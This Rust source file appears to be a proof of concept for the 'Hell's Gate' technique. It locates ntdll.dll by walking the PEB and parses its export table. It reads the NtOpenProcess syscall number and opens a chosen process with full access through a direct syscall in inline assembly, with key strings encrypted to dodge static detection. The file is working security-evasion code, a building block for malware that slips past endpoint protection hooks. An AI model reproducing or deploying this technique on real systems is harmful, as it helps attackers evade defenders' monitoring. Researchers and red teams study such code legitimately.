use std::arch::asm;
use std::ops::Add;
use std::os::windows::ffi::OsStringExt;
use std::slice::from_raw_parts;
use std::{env, panic};
use std::ffi::{c_void, OsString};
use std::mem::size_of;
use std::ptr::null_mut;
use str_crypter::{sc, decrypt_string};
use windows::Win32::Foundation::{HANDLE, NTSTATUS, UNICODE_STRING};
use windows::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_SIGNATURE};
use windows::Win32::System::Threading::PROCESS_ALL_ACCESS;
use windows::Win32::System::Diagnostics::Debug::{SetUnhandledExceptionFilter, EXCEPTION_POINTERS, IMAGE_NT_HEADERS64};

fn main() {

    // top-level exception filter to catch any exceptions
    // https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-setunhandledexceptionfilter
    unsafe {
        SetUnhandledExceptionFilter(Some(exception_filter));
    }

    // get pid from first positional argument
    let pid = cli_pid();

    // NtOpenProcess as an encrypted &str
    let nt = match sc!("NtOpenProcess", 20) {
        Ok(s) => s,
        Err(e) => panic!("Error converting  string: {e}"),
    };
    let nt_open_proc_str = nt.as_str();

    // ntdll.dll as an encrypted string
    let ntdll = match sc!("ntdll.dll", 20) {
        Ok(s) => s,
        Err(e) => panic!("Error converting  string: {e}"),
    };
    let ntdll: &str = ntdll.as_str();

    // get the SSN via the Hell's Gate technique
    let ssn = get_ssn(ntdll, nt_open_proc_str);
    let ssn = match ssn {
        None => panic!("[-] Unable to get SSN"),
        Some(s) => {
            println!("[+] Got SSN: {}", s);
            s
        }
    };

    let mut process_handle: HANDLE = HANDLE(0); // process handle result of NtOpenProcess
    let desired_access = PROCESS_ALL_ACCESS; // all access
    // set as defaults
    let mut object_attributes: ObjectAttributes = ObjectAttributes {
        length: size_of::<ObjectAttributes>() as u32,
        root_directory: HANDLE(0),
        object_name: null_mut(),
        attributes: 0,
        security_descriptor: null_mut(),
        security_quality_of_service: null_mut(),
    };
    // client_id required by https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess
    let mut client_id = ClientId {
        unique_process: pid as *mut c_void, // pid
        unique_thread: null_mut(),
    };

    // make the call into NtOpenProcess
    let status = nt_open_process(
        &mut process_handle, // will return the process handle
        desired_access.0, // u32
        &mut object_attributes,
        &mut client_id, // contains the pid
        ssn, // syscall number
    );

    if status.0 == 0 {
        println!("[+] Successfully opened process. Handle: {:?}", process_handle);
    } else {
        println!("[-] Failed to open process. NTSTATUS: {:#x}", status.0);
    }
}

/// Get the pid from the commandline arguments, positioned in the 1st positional argument
fn cli_pid() -> u32 {
    let args: Vec<String> = env::args().collect();
    if args.len() != 2 {
        panic!("Invalid commandline args. Expecting pid.");
    }

    let res = args[1].parse::<u32>().unwrap();

    res
}

#[repr(C)]
#[derive(Debug)]
// https://www.nirsoft.net/kernel_struct/vista/CLIENT_ID.html
struct ClientId {
    unique_process: *mut c_void,
    unique_thread: *mut c_void,
}

#[repr(C)]
#[derive(Debug)]
// https://microsoft.github.io/windows-docs-rs/doc/windows/Wdk/Foundation/struct.OBJECT_ATTRIBUTES.html#structfield.SecurityQualityOfService
pub struct ObjectAttributes {
    pub length: u32,
    pub root_directory: HANDLE,
    pub object_name: *const UNICODE_STRING, // https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Foundation/struct.UNICODE_STRING.html
    pub attributes: u32,
    pub security_descriptor: *const c_void,
    pub security_quality_of_service: *const c_void,
}

/// Get the SSN of the NTAPI function we wish to call
fn get_ssn(dll: &str, function_name: &str) -> Option<u32> {
    // get NTDLL base addr
    let addr =  match get_function_from_exports(dll, function_name) {
        Some(a) => a,
        None => panic!("Could not get address of {}", function_name),
    };
    
    // read the syscall number from the function's address
    // needs casting as *const u8 to allow dereferencing from c_void (no size in a c_void).
    // as each byte is 8 bits, we read as a u8 for 1 byte each
    let byte4 = unsafe { *(addr as *const u8).add(4) };
    let byte5 = unsafe { *(addr as *const u8).add(5) };
    
    // combine the fourth and fifth bytes into a u32 (DWORD)
    let nt_function_ssn = ((byte5 as u32) << 8) | (byte4 as u32);

    Some(nt_function_ssn)
}

// https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.OpenProcess.html
/// Make a system call to the equivalent of NtOpenProcess, without having to make an actual API call
fn nt_open_process(
    process_handle: *mut HANDLE,
    desired_access: u32,
    object_attributes: *mut ObjectAttributes,
    client_id: *mut ClientId,
    ssn: u32,
) -> NTSTATUS {
    let status: i32; // define as i32 so it can go into the syscall ok

    unsafe {
        asm!(
        "mov r10, rcx",
        "mov eax, {0:e}", // move the syscall number into EAX
        "syscall",
        in(reg) ssn, // input: Syscall number goes into EAX
        // Order: https://web.archive.org/web/20170222171451/https://msdn.microsoft.com/en-us/library/9z1stfyw.aspx
        in("rcx") process_handle, // passed to RCX (first argument)
        in("rdx") desired_access, // passed to RDX (second argument)
        in("r8") object_attributes, // passed to R8 (third argument)
        in("r9") client_id, // passed to R9 (fourth argument)
        lateout("rax") status, // output: returned value of the syscall is placed in RAX
        options(nostack), // dont modify the stack pointer (RSP)
        );
    }

    NTSTATUS(status as i32) // cast as NTSTATUS from u32
}

/// Exception filter to catch and handle exceptions, without this you will just get very generic
/// exceptions that make it almost impossible to find the issue...
unsafe extern "system" fn exception_filter(pointers: *const EXCEPTION_POINTERS) -> i32 {
    let exception_pointers = &*pointers;
    let exception_record = &*exception_pointers.ExceptionRecord;
    println!("Exception caught.. address: {:?}", exception_record.ExceptionAddress);
    println!("Exception code: {:#x}", exception_record.ExceptionCode.0 as u32);
    0
}

/// Get the base address of a specified module. Obtains the base address by reading from the TEB -> PEB -> 
/// PEB_LDR_DATA -> InMemoryOrderModuleList -> InMemoryOrderLinks -> DllBase 
/// 
/// Returns the DLL base address as a Option<usize> 
#[allow(unused_variables)]
#[allow(unused_assignments)]
fn get_module_base(module_name: &str) -> Option<usize> {

    let mut peb: usize;
    let mut ldr: usize;
    let mut in_memory_order_module_list: usize;
    let mut current_entry: usize;

    unsafe {
        // get the peb and module list
        asm!(
            "mov {peb}, gs:[0x60]",
            "mov {ldr}, [{peb} + 0x18]",
            "mov {in_memory_order_module_list}, [{ldr} + 0x10]", // points to the Flink
            peb = out(reg) peb,
            ldr = out(reg) ldr,
            in_memory_order_module_list = out(reg) in_memory_order_module_list,
        );

        println!("[+] Found the PEB and the InMemoryOrderModuleList at: {:p}", in_memory_order_module_list as *const c_void);
        println!("[i] Iterating through modules loaded into the process, searching for {}", module_name);

        // set the current entry to the head of the list
        current_entry = in_memory_order_module_list;
        
        // iterate the modules searching for 
        loop {
            // get the attributes we are after of the current entry
            let dll_base = *(current_entry.add(0x30) as *const usize);
            let module_name_address = *(current_entry.add(0x60) as *const usize);
            let module_length = *(current_entry.add(0x58) as *const u16);
            
            // check if the module name address is valid and not zero
            if module_name_address != 0 && module_length > 0 {
                // read the module name from memory
                let dll_name_slice = from_raw_parts(module_name_address as *const u16, (module_length / 2) as usize);
                let dll_name = OsString::from_wide(dll_name_slice);

                println!("[i] Found module: {:?}", dll_name);

                // do we have a match on the module name?
                if dll_name.to_string_lossy().eq_ignore_ascii_case(module_name) {
                    println!("[+] {:?} base address found: {:p}", dll_name, dll_base as *const c_void);
                    return Some(dll_base);
                }
            } else {
                println!("Invalid module name address or length.");
            }

            // dereference current_entry which contains the value of the next LDR_DATA_TABLE_ENTRY (specifically a pointer to LIST_ENTRY 
            // within the next LDR_DATA_TABLE_ENTRY)
            current_entry = *(current_entry as *const usize);

            // If we have looped back to the start, break
            if current_entry == in_memory_order_module_list {
                println!("Looped back to the start.");
                return None;
            }
        }
    }
}

/// Get the function address of a function in a specified DLL from the DLL Base.
/// 
/// # Parameters 
/// * dll_name -> the name of the DLL / module you are wanting to query
/// * needle -> the function name (case sensitive) of the function you are looking for
/// 
/// # Returns
/// Option<*const c_void> -> the function address as a pointer
fn get_function_from_exports(dll_name: &str, needle: &str) -> Option<*const c_void> {

    // get the dll base address
    let dll_base = match get_module_base(dll_name) {
        Some(a) => a,
        None => panic!("Unable to get address"),
    } as *mut c_void;

    // check we match the DOS header, cast as pointer to tell the compiler to treat the memory
    // address as if it were a IMAGE_DOS_HEADER structure
    let dos_header: IMAGE_DOS_HEADER = unsafe { read_memory(dll_base as *const IMAGE_DOS_HEADER) };
    if dos_header.e_magic != IMAGE_DOS_SIGNATURE {
        panic!("[-] DOS header not matched from base address: {:p}.", dll_base);
    }

    println!("[+] DOS header matched");

    // check the NT headers
    let nt_headers = unsafe { read_memory(dll_base.offset(dos_header.e_lfanew as isize) as *const IMAGE_NT_HEADERS64) };
    if nt_headers.Signature != IMAGE_NT_SIGNATURE {
        panic!("[-] NT headers do not match signature with from dll base: {:p}.", dll_base);
    }

    println!("[+] NT headers matched");

    // get the export directory
    // https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_data_directory
    // found from first item in the DataDirectory; then we take the structure in memory at dll_base + RVA
    let export_dir_rva = nt_headers.OptionalHeader.DataDirectory[0].VirtualAddress;
    let export_offset = unsafe {dll_base.add(export_dir_rva as usize) };
    let export_dir: IMAGE_EXPORT_DIRECTORY = unsafe { read_memory(export_offset as *const IMAGE_EXPORT_DIRECTORY) };
    
    // get the addresses we need
    let address_of_functions_rva = export_dir.AddressOfFunctions as usize;
    let address_of_names_rva = export_dir.AddressOfNames as usize;
    let ordinals_rva = export_dir.AddressOfNameOrdinals as usize;

    let functions = unsafe { dll_base.add(address_of_functions_rva as usize) } as *const u32;
    let names = unsafe { dll_base.add(address_of_names_rva as usize) } as *const u32;
    let ordinals = unsafe { dll_base.add(ordinals_rva as usize) } as *const u16;

    // get the amount of names to iterate over
    let number_of_names = export_dir.NumberOfNames;

    for i in 0..number_of_names {
        // calculate the RVA of the function name
        let name_rva = unsafe { *names.offset(i.try_into().unwrap()) as usize };
        // actual memory address of the function name
        let name_addr = unsafe { dll_base.add(name_rva) };
        
        // read the function name
        let function_name = unsafe {
            let char = name_addr as *const u8;
            let mut len = 0;
            // iterate over the memory until a null terminator is found
            while *char.add(len) != 0 {
                len += 1;
            }

            std::slice::from_raw_parts(char, len)
        };

        let function_name = std::str::from_utf8(function_name).unwrap_or("Invalid UTF-8");

        // if we have a match on our function name
        if function_name.eq(needle) {
            println!("[+] Function name found: {}", needle);

            // calculate the RVA of the function address
            let ordinal = unsafe { *ordinals.offset(i.try_into().unwrap()) as usize };
            let fn_rva = unsafe { *functions.offset(ordinal as isize) as usize };
            // actual memory address of the function address
            let fn_addr = unsafe { dll_base.add(fn_rva) } as *const c_void;

            println!("[i] Function address: {:p}", fn_addr);

            return Some(fn_addr);
        }
    }

    None
}

/// Read memory of any type
unsafe fn read_memory<T>(address: *const T) -> T {
    std::ptr::read(address)
}